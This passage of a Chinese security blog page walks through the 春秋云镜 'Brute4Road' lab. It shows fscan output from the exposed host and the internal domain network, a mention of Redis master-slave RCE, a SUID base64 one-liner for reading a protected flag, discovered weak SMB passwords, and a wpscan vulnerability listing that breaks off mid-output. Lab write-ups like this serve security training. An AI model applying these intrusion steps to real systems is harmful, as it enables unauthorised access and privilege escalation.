@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/xxx/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lvzhouhang.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="先用fscan扫一下 1234567891011121314151617181920212223242526272829303132┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# ..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.99.231.184┌──────────────────────────────────────────────┐│    ___">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Brute4Road">
+<meta property="og:url" content="https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/index.html">
+<meta property="og:site_name" content="lvzhouhang">
+<meta property="og:description" content="先用fscan扫一下 1234567891011121314151617181920212223242526272829303132┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# ..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.99.231.184┌──────────────────────────────────────────────┐│    ___">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png">
+<meta property="article:published_time" content="2025-04-15T06:35:35.000Z">
+<meta property="article:modified_time" content="2025-04-15T10:41:13.025Z">
+<meta property="article:author" content="lvzhouhang">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png">
+
+<link rel="canonical" href="https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>春秋云镜-Brute4Road | lvzhouhang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/clicklove.js"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lvzhouhang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          春秋云镜-Brute4Road
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-04-15 14:35:35 / 修改时间：18:41:13" itemprop="dateCreated datePublished" datetime="2025-04-15T14:35:35+08:00">2025-04-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>先用fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.231.184</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store</span><br><span class="line">[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184      状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb</span><br><span class="line">[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>
+
+<p>打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 ./flag01|/usr/bin/base64 -d</span><br></pre></td></tr></table></figure>
+
+<p>ftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.7/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2024-08-08T17:00:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 7.0.6</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo &lt; 6.9.0 - Unauthenticated RCE</span><br><span class="line"> |     Fixed in: 6.9.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span 